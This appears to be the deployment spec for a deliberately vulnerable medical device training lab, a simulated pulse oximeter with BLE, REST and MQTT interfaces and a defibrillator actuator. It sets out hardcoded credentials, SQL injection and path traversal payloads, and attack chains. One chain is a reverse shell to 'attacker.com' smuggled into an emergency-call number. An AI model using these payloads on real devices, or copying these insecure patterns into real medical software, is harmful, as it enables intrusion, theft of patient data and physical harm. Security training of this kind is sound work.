# CareOtter - Medical Device Lab (Layer 2)

**Stage Purpose**: Deploy a vulnerable medical pulse oximeter device simulator with BLE GATT services, HTTP REST API, MQTT broker, and emergency actuation systems for comprehensive medical IoT security training.

## Scenario

A medical-grade pulse oximeter (CareOtter) has been deployed for patient monitoring. The device uses BLE for mobile app connectivity with HTTP fallback, MQTT for administrative functions, and GPIO-controlled emergency actuators. The system contains multiple intentional vulnerabilities representing real-world medical device security flaws.

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    RASPBERRY PI 3B+ (OpenWrt)                       │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌───────────┐│
│  │  MAX30102    │  │  Vitals      │  │  REST API    │  │  BLE GATT ││
│  │  (Sim/Real)  │→ │  Service     │→ │  (Flask)     │← │  Server   ││
│  └──────────────┘  └──────────────┘  └──────────────┘  └─────┬─────┘│
│         │                 │                  │                │     │
│         └─────────────────┴──────────────────┴────────────────┘     │
│                           │                                         │
│                    ┌──────┴──────┐                                  │
│                    │  Emergency  │                                  │
│                    │  Controller │                                  │
│                    └──────┬──────┘                                  │
│                           │                                         │
│              ┌────────────┼────────────┐                            │
│              ▼            ▼            ▼                            │
│  ┌─────────────────┐ ┌──────────┐ ┌──────────────┐                  │
│  │ Actuator        │ │ Panic    │ │ Telephony    │                  │
│  │ "Defibrillator" │ │ Button   │ │ Service      │                  │
│  │ (GPIO/Relay)    │ │ (GPIO)   │ │ (Simulated)  │                  │
│  └─────────────────┘ └──────────┘ └──────────────┘                  │
└─────────────────────────────────────────────────────────────────────┘
         │                    │                      │
         │ BLE (primary)      │ HTTP (fallback)      │ MQTT (admin)
         ▼                    ▼                      ▼
┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐
│  Android App    │  │  Android App    │  │  Web Panel      │
│  (CareOtter Mon)│  │  (Debug Mode)   │  │  (Admin/Doctor) │
│  - Vitals Monitor│  │  - Configuration│  │  - Patient History│
│  - BLE Alerts   │  │  - Emergency    │  │  - Patient Mgmt │
└─────────────────┘  └─────────────────┘  └─────────────────┘
         │
         ▼
┌────────────────────┐
│  Database          │
│  SQLite (local)    │  ◄── Vulnerability: SQLi without WAF
│  /tmp/careotter.db │
└────────────────────┘
```

## Inputs

| Layer | Source Path | Role/Description |
|-------|-------------|------------------|
| **Layer 3** | `../../docs/CareOtter/CareOtter.md` | Architecture and vulnerability documentation |
| **Layer 4** | `files/opt/medical-sensor/*.py` | Sensor service, BLE server implementations |
| **Layer 4** | `files/etc/init.d/` | OpenWRT service init scripts |
| **Layer 4** | `files/etc/config/` | UCI configuration files |
| **Layer 4** | `files/usr/lib/vulnzoo-hooks/` | Hook-based initialization scripts |

## Process

### 1. Analyze Deployment Requirements

**Hardware Stack:**
| Component | Type | Interface | Notes |
|-----------|------|-----------|-------|
| MAX30102 | Sensor | I2C | Real or simulated pulse oximeter |
| GPIO 18 | Input | Digital | Panic button interrupt |
| GPIO 23 | Output | Digital | Defibrillator relay/LED simulator |

**Network Services:**
| Service | Port | Protocol | Purpose |
|---------|------|----------|---------|
| HTTP API | 8081 | TCP | REST API (Flask) |
| MQTT Broker | 1883 | TCP | Admin/telemetry (no TLS) |
| BLE GATT | - | Bluetooth LE | Primary mobile connectivity |

**Database Schema (SQLite):**
```sql
-- careotter.db
CREATE TABLE patients (
    id INTEGER PRIMARY KEY,
    name TEXT,
    ssn TEXT,  -- SSN unencrypted
    bpm_min INTEGER,
    bpm_max INTEGER,
    spo2_threshold INTEGER,
    emergency_contact TEXT,
    medical_notes TEXT  -- Sensitive medical history
);

CREATE TABLE vitals_log (
    id INTEGER PRIMARY KEY,
    patient_id INTEGER,
    timestamp REAL,
    bpm INTEGER,
    spo2 INTEGER,
    FOREIGN KEY(patient_id) REFERENCES patients(id)
);
```

### 2. Apply Vulnerability Configuration

**Communication Vulnerabilities:**

| Vuln # | Type | Location | Description |
|--------|------|----------|-------------|
| #1 | BLE Weak Pairing | `/etc/bluetooth/careotter.conf` | JustWorks pairing, hardcoded LTK |
| #2 | Command Injection | `/emergency/call` | `os.system(f"asterisk -rx 'channel originate Local/{number}...'")` |
| #3 | MQTT No ACL | Mosquitto | Any client can publish to `careotter/emergency/activate` |
| #4 | IDOR | `/config/thresholds/<patient_id>` | Change other patients' thresholds |
| #5 | Race Condition | Panic button | Spam blocks emergency service (DoS) |
| #6 | Broken Business Logic | `/defibrillator/discharge` | Discharge without prior charging |
| #7 | Path Traversal | Phone service | `number="../../../../etc/passwd"` |

**API Vulnerabilities:**

| Endpoint | Vulnerability | Payload |
|----------|---------------|---------|
| `/vitals/stream` | No authentication | Direct access exposes all vitals |
| `/emergency/call` | Command Injection | `{"number": ";id > /tmp/pwned;"}` |
| `/defibrillator/charge` | Hardcoded credential | `auth_code: "1234"` |
| `/defibrillator/discharge` | No state verification | POST without prior charge |
| `/config/thresholds/<id>` | IDOR + SQLi | `id=1 UNION SELECT * FROM patients--` |
| `/api/v1/patients/<id>/records` | SQL Injection | `id=1 OR 1=1--` |
| `/api/v1/export` | Path Traversal | `patient_id=../../../../etc/shadow` |
| `/api/v1/login` | Weak JWT | Signed with `secret123` |

**BLE GATT Services (Vulnerable):**

| Service | UUID | Characteristic | Vulnerability |
|---------|------|----------------|---------------|
| Heart Rate | 0x180D | 0x2A37 (BPM) | Plaintext notifications |
| Heart Rate | 0x180D | 0x2A38 (SpO2) | Spoofable data |
| CareOtter Emergency | 0xFF00 | careotter-emergency-uuid-1234 | Write without auth |

**MQTT Topics (No ACL):**
- `careotter/patient/+/vitals` - Data publication
- `careotter/admin/config` - Config changes
- `careotter/emergency/activate` - Retained message poisoning possible

### 3. Transform (Deployment Steps)

**Step 1: Install System Dependencies:**
```bash
opkg install python3 python3-pip kmod-i2c-core i2c-tools
opkg install mosquitto mosquitto-client
opkg install bluez-libs bluez-utils
```

**Step 2: Install Python Packages:**
```bash
pip3 install flask bleak smbus2 paho-mqtt
```

**Step 3: Deploy Configuration Files:**
```
files/
├── etc/
│   ├── config/
│   │   └── careotter          # UCI configuration
│   ├── bluetooth/
│   │   └── careotter.conf     # Hardcoded LTK
│   ├── init.d/
│   │   ├── medical-sensor     # HTTP service init
│   │   ├── ble-server         # BLE GATT server init
│   │   └── mosquitto          # MQTT broker init
│   └── careotter/
│       ├── config.ini         # Hardcoded credentials
│       └── phone.sh           # Emergency telephony script
├── opt/medical-sensor/
│   ├── sensor_service.py      # Flask REST API
│   └── ble_server.py          # BLE GATT server
└── tmp/
    ├── medical-logs/          # RAM-based logs
    └── careotter.db           # SQLite database
```

**Step 4: Configure BLE Pairing (Vulnerable):**
```bash
# /etc/bluetooth/careotter.conf
[General]
Name = CareOtter-Medical
Pairing = JustWorks
# Hardcoded LTK for demonstration
LTK = 1234567890ABCDEF1234567890ABCDEF
```

**Step 5: Configure MQTT (No ACL):**
```bash
# /etc/mosquitto/mosquitto.conf
port 1883
allow_anonymous true
# No ACL file defined - any client can publish/subscribe
```

**Step 6: Initialize Database:**
```bash
sqlite3 /tmp/careotter.db <<EOF
CREATE TABLE patients (id INTEGER PRIMARY KEY, name TEXT, ssn TEXT, 
    bpm_min INTEGER, bpm_max INTEGER, spo2_threshold INTEGER,
    emergency_contact TEXT, medical_notes TEXT);
INSERT INTO patients VALUES (1, 'John Doe', '123-45-6789', 60, 100, 90,
    '555-0100', 'Hypertension, Diabetes Type 2');
EOF
chmod 666 /tmp/careotter.db  # World writable - intentional vulnerability
```

**Step 7: Start Services:**
```bash
/etc/init.d/mosquitto start
/etc/init.d/medical-sensor start
/etc/init.d/ble-server start
```

### 4. Refine

**Verification Steps:**
```bash
# Test HTTP API
curl http://192.168.2.1:8081/health
curl http://192.168.2.1:8081/vitals
curl http://192.168.2.1:8081/config

# Test BLE
bluetoothctl scan le
gatttool -b <MAC> --characteristics

# Test MQTT
mosquitto_sub -h 192.168.2.1 -t "careotter/patient/+/vitals"
mosquitto_pub -h 192.168.2.1 -t "careotter/emergency/activate" -m '{"panic":true}'
```

## Outputs

| Artifact | Path/Port | Description |
|----------|-----------|-------------|
| HTTP API | `:8081` | Flask REST API |
| Vitals Endpoint | `:8081/vitals` | Real-time BPM/SpO2 |
| Config Endpoint | `:8081/config` | Device configuration |
| Log Endpoint | `:8081/log` | Historical vitals |
| MQTT Broker | `:1883` | Unauthenticated pub/sub |
| BLE GATT | hci0 | Heart Rate (0x180D), Emergency (0xFF00) |
| SQLite DB | `/tmp/careotter.db` | Patient data (unencrypted SSN) |
| Logs | `/tmp/medical-logs/` | Rotating vitals log |
| GPIO 18 | Physical | Panic button input |
| GPIO 23 | Physical | Defibrillator output |

## Vulnerability Tree by Attack Type

### Physical/IoT Attacks

| Attack | Method | Impact |
|--------|--------|--------|
| BLE Spoofing | MAC spoofing + fake vitals | False medical data injection |
| Jamming | 2.4GHz interference | Force fallback to HTTP (easier to intercept) |
| Hardware Hacking | UART extraction | Read `/etc/careotter/secrets.conf` |

### Network Attacks

| Attack | Method | Impact |
|--------|--------|--------|
| BLE MITM | Capture JustWorks pairing | Decrypt LTK, intercept all traffic |
| MQTT Subscribe | `mosquitto_sub -t '#'` | Access all patient data |
| HTTP Interception | Burp Proxy | Modify BPM thresholds in transit |
| Retained Poisoning | `mosquitto_pub -r -t careotter/emergency/activate` | Persistent fake emergency |

### Application Attacks (Business Logic)

| Attack | Method | Impact |
|--------|--------|--------|
| Business Logic | Send BPM=0 via API | Trigger automatic defibrillation |
| Race Condition | Parallel `/defibrillator/charge` | Simulated overload/state bug |
| Replay Attack | Reuse old JWT | No `iat`/`exp` verification |

### Database Attacks

| Attack | Method | Impact |
|--------|--------|--------|
| SQL Injection | `/api/v1/patients/1 OR 1=1--` | Extract all SSNs and medical notes |
| Path Traversal | `patient_id=../../../../etc/shadow` | Read system files |
| RCE via SQLite | `load_extension()` | Code execution (if enabled) |

## Attack Chains

### Chain 1: BLE MITM → Data Injection → False Emergency
```
Capture JustWorks pairing → Decrypt LTK
  ↓
Connect to BLE GATT service 0x180D
  ↓
Write spoofed vitals (BPM=0, SpO2=0) to characteristic 0x2A37
  ↓
Emergency controller triggers false alarm
```

### Chain 2: MQTT Subscribe → Retained Poisoning → Mass Panic
```
Connect to MQTT broker (no auth required)
  ↓
Subscribe to `careotter/patient/+/vitals` (harvest all patient data)
  ↓
Publish retained emergency message: `{"panic":true}` to `careotter/emergency/activate`
  ↓
All connecting devices receive fake emergency
```

### Chain 3: SQL Injection → Data Exfiltration → Identity Theft
```
GET /api/v1/patients/1 UNION SELECT ssn,name,medical_notes FROM patients--
  ↓
Extract unencrypted SSNs and medical history
  ↓
Medical identity theft / insurance fraud
```

### Chain 4: Command Injection → Reverse Shell → Device Takeover
```
POST /emergency/call with `{"number": ";nc -e /bin/sh attacker.com 4444;"}`
  ↓
os.system executes: asterisk -rx '...' ;nc -e /bin/sh attacker.com 4444;
  ↓
Reverse shell as root on medical device
```

### Chain 5: Hardcoded Credentials → Defibrillator Control → Patient Harm
```
Read /etc/careotter/config.ini → auth_code = "1234"
  ↓
POST /defibrillator/charge with auth_code: "1234"
  ↓
POST /defibrillator/discharge (no state check)
  ↓
Unauthorized "shock" delivery
```

## API Reference

### HTTP Endpoints

| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| GET | `/health` | No | Health check |
| GET | `/vitals` | No | Current BPM/SpO2 |
| GET | `/config` | No | Device configuration |
| GET | `/log` | No | Historical vitals |
| GET | `/log/last` | No | Latest summary |
| POST | `/emergency/call` | No | Emergency telephony (vulnerable to injection) |
| POST | `/defibrillator/charge` | Hardcoded code | Charge defibrillator |
| POST | `/defibrillator/discharge` | No | Discharge defibrillator (no state check) |
| GET | `/api/v1/patients/<id>/records` | JWT | Patient records (SQLi) |
| GET | `/api/v1/export` | JWT | Export data (path traversal) |
| POST | `/api/v1/login` | No | Authentication (weak JWT) |

### BLE GATT Characteristics

| Service | Characteristic | Properties | Security |
|---------|----------------|------------|----------|
| 0x180D (Heart Rate) | 0x2A37 | Notify | None (plaintext) |
| 0x180D (Heart Rate) | 0x2A38 | Read | None (spoofable) |
| 0xFF00 (Emergency) | careotter-emergency-uuid-1234 | Write | None (no auth) |

## Dependencies

| Component | Requirement |
|-----------|-------------|
| Hardware | Raspberry Pi 3B+ with I2C, GPIO |
| Sensor | MAX30102 (optional, simulator works without) |
| OS | OpenWRT v24.10.2 |
| Python | 3.11+ with flask, bleak, smbus2 |
| Bluetooth | BlueZ with BLE support |
| MQTT | Mosquitto broker |
| Mobile | Android with flutter_blue_plus |

## Verification Checklist

- [ ] HTTP API responds on port 8081
- [ ] `/vitals` returns BPM/SpO2 data
- [ ] BLE advertising as "CareOtter-Medical"
- [ ] MQTT broker accepts anonymous connections
- [ ] SQLite database at `/tmp/careotter.db`
- [ ] GPIO 18 triggers panic interrupt
- [ ] GPIO 23 controls defibrillator LED
- [ ] SQL injection works on `/api/v1/patients/<id>/records`
- [ ] Command injection works on `/emergency/call`
- [ ] Hardcoded `auth_code: "1234"` works

## Regulatory Context

This lab demonstrates violations of:
- **FDA Cybersecurity Guidance** - Unencrypted PHI, hardcoded credentials
- **HIPAA** - Unencrypted SSNs, lack of access controls
- **EU MDR** - Insecure update mechanisms
- **IEC 62304** - Insecure software lifecycle

## References

- Docs: `docs/CareOtter/CareOtter.md`
- Hardware: MAX30102 pulse oximeter sensor
- Protocols: BLE GATT, MQTT, HTTP/REST
- Database: SQLite3
- Framework: Flask (Python)
